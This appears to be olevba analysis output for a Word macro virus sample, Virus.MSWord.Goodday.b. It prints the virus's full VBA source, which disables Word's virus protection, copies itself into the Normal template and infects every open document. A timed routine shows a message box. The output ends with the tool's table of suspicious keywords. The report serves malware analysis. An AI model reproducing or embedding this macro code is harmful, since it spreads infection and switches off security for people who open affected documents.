olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Goodday.b-5a6c0b06fd4a1790713669c865f56710e2b2ede1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Goodday.b-5a6c0b06fd4a1790713669c865f56710e2b2ede1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Maniac.bas 
in file: Virus.MSWord.Goodday.b-5a6c0b06fd4a1790713669c865f56710e2b2ede1 - OLE stream: 'Macros/VBA/Maniac'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
  
  MacroCopy "open"
  
End Sub
Sub AutoNew()

  MacroCopy "new"
  
End Sub
Sub AutoClose()

  MacroCopy "close"
  
End Sub

Sub MacroCopy(ctype)

  On Error GoTo 0
    
  Application.Options.VirusProtection = False
  
  TExist = 0
  'For Each xItem In NormalTemplate.VBProject.VBComponents
  For Each xitem In NormalTemplate.VBProject.VBComponents
    'If xitem.Type = vbext_ct_StdModule Then Count = Count + 1
    If xitem.Name = "Maniac" Then TExist = 1
  Next xitem
  If TExist = 0 Then _
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
    
  For Each openDoc In Documents
    'MsgBox openDoc.FullName
    DExist = 0
    For Each xitem In openDoc.VBProject.VBComponents
      If xitem.Name = "Maniac" Then DExist = 1
    Next xitem
    If DExist = 0 Then
      Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=openDoc.FullName, Name:="Maniac", Object:=wdOrganizerObjectProjectItems
      If ctype = "open" Then openDoc.Save
    End If
  Next openDoc
   
End Sub

Sub AutoExec()
  
  gooday$ = GetSetting("Maniac", "1.0", "Date", "")
  If gooday$ = CStr(Date) Then
    msg = Chr(13) + Chr(13)
    msg = msg + Application.UserName + ":" + Chr(13) & Chr(13)
    msg = msg + "    ÄãºÃ£¬ºÜ¸ßÐËÀ´µ½ÄãµÄ¼ÆËã»ú£¬ÎÒÏ²»¶" + Chr(13) + Chr(13)
    msg = msg + "ÕâÀïµÄÒ»ÇÐ£¬ÓÈÆäÊÇMicrosoft Word£¬ËüÊ¹" + Chr(13) + Chr(13)
    msg = msg + "ÎÒÃÇµÄ¹¤×÷±äµÃÒì³£ÓÐÈ¤¡£" + Chr(13) + Chr(13)
    msg = msg + "    Èç¹ûÎÒµÄµ½À´¸Ä±äÁËÄãµ¥µ÷µÄÉú»î£¬Çë" + Chr(13) + Chr(13)
    msg = msg + "²»Òª½éÒâ¡£" + Chr(13) + Chr(13)
    msg = msg + "    Ô¸¼ÆËã»úÇ°µÄÄãÐÄÇéÓä¿ì¡£" + Chr(13) + Chr(13) + Chr(13)
    msg = msg + "         Maniac write by " + Date$ + "         "
    MsgBox msg, vbInformation, "Maniac 1.0"
  Else
    If gooday$ = "" Then SaveSetting "Maniac", "1.0", "Date", CStr(Date + 10)
  End If
  
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

